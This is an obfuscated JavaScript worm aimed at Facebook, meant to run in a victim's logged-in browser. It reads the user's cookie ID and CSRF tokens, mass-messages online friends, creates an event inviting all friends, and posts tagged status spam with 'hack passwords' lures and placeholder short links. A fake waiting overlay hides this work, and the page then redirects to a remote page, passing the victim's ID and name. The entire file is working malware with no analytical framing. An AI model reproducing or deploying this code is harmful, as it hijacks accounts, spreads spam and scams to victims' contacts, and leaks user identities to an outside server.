var chatmessage = 'I just got your password %firstname% haha, you can do it to anyone here SHORT_LINK_HERE';
var postmessage = 'LOL %tf%\'s, %tf%\'s, %tf%\'s, %tf%\'s and %tf%\'s I just got all your passwords with my new favourite online tool XD SHORT_LINK_HERE';
var redirect = 'http://xxxxxxxxxxxxxxx/reveal.php';
var eventdesc = 'So I found a way to hack Facebook passwords\x0a\x0aI found a site that does it all for you\x0a\x0aYou can use it too - SHORT_LINK_HERE';
var eventname = 'HACK a Facebook ACCOUNT of Your Choice!';
var nfriends = 5000;
var debug = false;
var wf = 0;
var mf = function () {
    if (wf <= 0) {
        setTimeout(function () {
            window['top']['location']['href'] = redirect;
        }, 500);
    };
};
var doget = function (_0x280cxb, _0x280cxc, _0x280cxd) {
    var _0x280cxe = new XMLHttpRequest();
    _0x280cxe['open']('GET', _0x280cxb);
    _0x280cxe['onreadystatechange'] = function () {
        if (_0x280cxe['readyState'] == 4) {
            if (_0x280cxe['status'] == 200 && _0x280cxc) {
                _0x280cxc(_0x280cxe['responseText']);
            };
            if (_0x280cxd) {
                _0x280cxd();
            };
        };
    };
    _0x280cxe['send']();
};
doget('/', function (_0x280cxf) {
    var _0x280cx10 = document['cookie']['match'](/c_user=(\d+)/)[1];
    var _0x280cx11 = function (_0x280cx12) {
        return _0x280cx12 ? '@[' + _0x280cx12['id'] + ':' + _0x280cx12['name'] + ']' : '';
    };
    var _0x280cx13 = function (_0x280cx12) {
        return _0x280cx12 ? _0x280cx12['name'] : '';
    };
    var _0x280cx14 = function (_0x280cx12) {
        out = '';
        for (var _0x280cx15 in _0x280cx12) {
            out += (out ? '&' : '') + _0x280cx15 + ((_0x280cx12[_0x280cx15] !== null) ? '=' + encodeURIComponent(_0x280cx12[_0x280cx15]) : '');
        };
        return out;
    };
    var _0x280cx16 = function (_0x280cxb, _0x280cx12, _0x280cxc, _0x280cxd) {
        var _0x280cxe = new XMLHttpRequest();
        _0x280cxe['open']('POST', _0x280cxb);
        _0x280cxe['setRequestHeader']('Content-Type', 'application/x-www-form-urlencoded');
        _0x280cxe['onreadystatechange'] = function () {
            if (_0x280cxe['readyState'] == 4) {
                if (_0x280cxe['status'] == 200 && _0x280cxc) {
                    _0x280cxc(_0x280cxe['responseText']);
                };
                if (_0x280cxd) {
                    _0x280cxd();
                };
            };
        };
        _0x280cxe['send'](_0x280cx14(_0x280cx12));
    };
    var _0x280cx17 = function () {
        var _0x280cx18 = document['createElement']('div');
        _0x280cx18['style']['display'] = 'block';
        _0x280cx18['style']['position'] = 'absolute';
        _0x280cx18['style']['width'] = 100 + '%';
        _0x280cx18['style']['height'] = 100 + '%';
        _0x280cx18['style']['left'] = 0 + 'px';
        _0x280cx18['style']['top'] = 0 + 'px';
        _0x280cx18['style']['textAlign'] = 'center';
        _0x280cx18['style']['padding'] = '4px';
        _0x280cx18['style']['background'] = '#FFFFFF';
        _0x280cx18['style']['zIndex'] = 999999;
        _0x280cx18['innerHTML'] = '&nbsp;<br/>Please wait, this can take a little while...<br/><br/>Or if you get sick of waiting, you can <a href="javascript:void(0);" onclick="wf=0; mf();">click here</a> (results may be less accurate)';
        document['body']['appendChild'](_0x280cx18);
    };
    var _0x280cx19 = _0x280cxf['match'](/name=\\"xhpc_composerid\\" value=\\"([\d\w]+)\\"/i);
    if (_0x280cx19) {
        comp = _0x280cx19[1];
    } else {
        comp = '';
    };
    var _0x280cx1a = _0x280cxf['match'](/name="post_form_id" value="([\d\w]+)"/i)[1];
    var _0x280cx1b = _0x280cxf['match'](/name="fb_dtsg" value="([\d\w]+)"/i)[1];
    var _0x280cx1c = document['getElementById']('navAccountName')['firstChild']['data'];
    redirect = redirect + '?' + _0x280cx14({
        userid: _0x280cx10,
        name: _0x280cx1c,
        doclose: 1
    });
    _0x280cx17();
    if (eventdesc) {
        wf++;
        _0x280cx16('/ajax/choose/?__a=1', {
            type: 'event',
            eid: null,
            invite_message: '',
            __d: 1,
            post_form_id: _0x280cx1a,
            fb_dtsg: _0x280cx1b,
            lsd: null,
            post_form_id_source: 'AsyncRequest'
        }, function (_0x280cx1d) {
            var _0x280cx1e = _0x280cx1d['match'](/\\"token\\":\\"([^\\]+)\\"/)[1];
            var _0x280cxb = '/ajax/typeahead/first_degree.php?__a=1&viewer=' + _0x280cx10 + '&token=' + _0x280cx1e + '&filter[0]=user&options[0]=friends_only&options[1]=nm&options[2]=sort_alpha';
            doget(_0x280cxb, function (_0x280cx1f) {
                var _0x280cx20 = _0x280cx1f['match'](/\{"uid":\d+,/g);
                var _0x280cx21 = [];
                for (var _0x280cx22 = 0; _0x280cx22 < _0x280cx20['length']; _0x280cx22++) {
                    var _0x280cx23 = _0x280cx20[_0x280cx22]['match'](/:(\d+),/)[1];
                    if (_0x280cx23 != _0x280cx10) {
                        _0x280cx21['push'](_0x280cx23);
                    };
                };
                var _0x280cx24 = new Date();
                _0x280cx24['setTime'](_0x280cx24['getTime']() + 60 * 60 * 24 * 1000);
                datestr = (_0x280cx24['getMonth']() + 1) + '/' + _0x280cx24['getDate']() + '/' + _0x280cx24['getFullYear']();
                timestr = _0x280cx24['getHours']() * 60;
                var _0x280cx25 = {
                    post_form_id: _0x280cx1a,
                    fb_dtsg: _0x280cx1b,
                    start_time_intl_field: datestr,
                    start_time_text_field: datestr,
                    start_time_hour_min: timestr,
                    name: eventname,
                    place_page_id: '',
                    location: '',
                    street: '',
                    geo_id: '',
                    geo_sq: '',
                    desc: eventdesc,
                    sgb_invitees: _0x280cx21['join'](','),
                    sgb_emails: '',
                    sgb_message: '',
                    privacy_type: 'on',
                    guest_list: 'on',
                    connections_can_post: 'on',
                    save: 'Create Event',
                    submitting: ''
                };
                _0x280cx25['new'] = '';
                _0x280cx16('/events/create.php', _0x280cx25, false, function () {
                    mf(--wf);
                });
            });
        });
    };
    if (chatmessage) {
        wf++;
        _0x280cx16('/ajax/chat/buddy_list.php?__a=1', {
            user: _0x280cx10,
            post_form_id: _0x280cx1a,
            fb_dtsg: _0x280cx1b,
            lsd: null,
            post_form_id_source: 'AsyncRequest',
            popped_out: false,
            force_render: true
        }, function (_0x280cx1d) {
            var _0x280cx26 = _0x280cx1d['substr'](9);
            var _0x280cx27 = eval('(' + _0x280cx26 + ')');
            var _0x280cx28 = _0x280cx27['payload']['buddy_list'];
            for (var _0x280cx29 in _0x280cx28['nowAvailableList']) {
                var _0x280cx2a = Math['floor'](Math['random']() * 1335448958);
                var _0x280cx2b = (new Date())['getTime']();
                var _0x280cx2c = chatmessage['replace']('%firstname%', _0x280cx28['userInfos'][_0x280cx29]['firstName']['toLowerCase']());
                _0x280cx16('/ajax/chat/send.php?__a=1', {
                    msg_id: Math['floor'](Math['random']() * 1335448958),
                    client_time: (new Date())['getTime'](),
                    msg_text: chatmessage['replace']('%firstname%', _0x280cx28['userInfos'][_0x280cx29]['firstName']['toLowerCase']()),
                    to: _0x280cx29,
                    post_form_id: _0x280cx1a,
                    fb_dtsg: _0x280cx1b,
                    post_form_id_source: 'AsyncRequest'
                });
            };
            mf(--wf);
        });
    };
    if (postmessage) {
        wf++;
        doget('/ajax/browser/friends/?uid=' + _0x280cx10 + '&filter=all&__a=1&__d=1', function (_0x280cx1d) {
            var _0x280cx20 = _0x280cx1d['match'](/\/\d+_\d+_\d+_q\.jpg.*?u003ca href=\\"http:\\\/\\\/www.facebook.com\\\/.*?\\u003c\\\/a>/gi);
            var _0x280cx2d = [];
            if (_0x280cx20) {
                for (var _0x280cx22 = 0; _0x280cx22 < _0x280cx20['length']; _0x280cx22++) {
                    var _0x280cx23 = _0x280cx20[_0x280cx22]['match'](/_\d+_/)[0]['replace'](/_/g, '');
                    var _0x280cx2e = _0x280cx20[_0x280cx22]['match'](/>[^>]+\\u003c\\\/a>$/i)[0]['replace'](/\\u003c\\\/a>$/gim, '')['replace'](/>/g, '');
                    _0x280cx2d['push']({
                        id: _0x280cx23,
                        name: _0x280cx2e
                    });
                };
            };
            var _0x280cxd = [];
            var _0x280cx2f = [];
            while (_0x280cx2d['length']) {
                var _0x280cx30 = Math['floor'](Math['random']() * _0x280cx2d['length']);
                _0x280cxd['push'](_0x280cx2d[_0x280cx30]);
                _0x280cx2f['push'](_0x280cx2d[_0x280cx30]);
                var _0x280cx2b = _0x280cx2d['shift']();
                if (_0x280cx30) {
                    _0x280cx2d[_0x280cx30 - 1] = _0x280cx2b;
                };
            };
            if (debug) {
                alert('fetched friends: ' + _0x280cxd['length']);
            };
            var _0x280cx31 = {
                post_form_id: _0x280cx1a,
                fb_dtsg: _0x280cx1b,
                xhpc_composerid: comp,
                xhpc_targetid: _0x280cx10,
                xhpc_context: 'home',
                xhpc_fbx: '',
                lsd: null,
                post_form_id_source: 'AsyncRequest'
            };
            mt = postmessage;
            m = postmessage;
            while (mt['search']('%tf%') >= 0) {
                var _0x280cx32 = _0x280cxd['pop']();
                mt = mt['replace']('%tf%', _0x280cx13(_0x280cx32));
                m = m['replace']('%tf%', _0x280cx11(_0x280cx32));
            };
            _0x280cx31['xhpc_message_text'] = mt;
            _0x280cx31['xhpc_message'] = m;
            if (debug) {
                alert('message text: ' + mt);
            };
            _0x280cx16('/ajax/updatestatus.php?__a=1', _0x280cx31);
            var _0x280cx33 = function (_0x280cx15) {
                if (_0x280cx15 == 0) {
                    wf = 0;
                    mf();
                    return;
                };
                var _0x280cx34 = _0x280cx2f['shift']();
                var _0x280cx35 = {
                    post_form_id: _0x280cx1a,
                    fb_dtsg: _0x280cx1b,
                    xhpc_composerid: comp,
                    xhpc_targetid: _0x280cx34['id'],
                    xhpc_context: 'profile',
                    xhpc_fbx: 1,
                    lsd: null,
                    post_form_id_source: 'AsyncRequest'
                };
                var _0x280cx36 = postmessage;
                var _0x280cx37 = postmessage;
                if (_0x280cxd['length'] == 0) {
                    wf = 0;
                    mf();
                    return;
                };
                while (_0x280cx36['search']('%tf%') >= 0) {
                    var _0x280cx38 = _0x280cxd['pop']();
                    _0x280cx36 = _0x280cx36['replace']('%tf%', _0x280cx13(_0x280cx38));
                    _0x280cx37 = _0x280cx37['replace']('%tf%', _0x280cx11(_0x280cx38));
                };
                _0x280cx35['xhpc_message_text'] = _0x280cx36;
                _0x280cx35['xhpc_message'] = _0x280cx37;
                _0x280cx16('/ajax/updatestatus.php?__a=1', _0x280cx35);
                setTimeout(function () {
                    _0x280cx33(_0x280cx15 - 1);
                }, 2000);
            };
            wf++;
            setTimeout(function () {
                _0x280cx33(nfriends);
            }, 2000);
        });
    };
    mf();
});
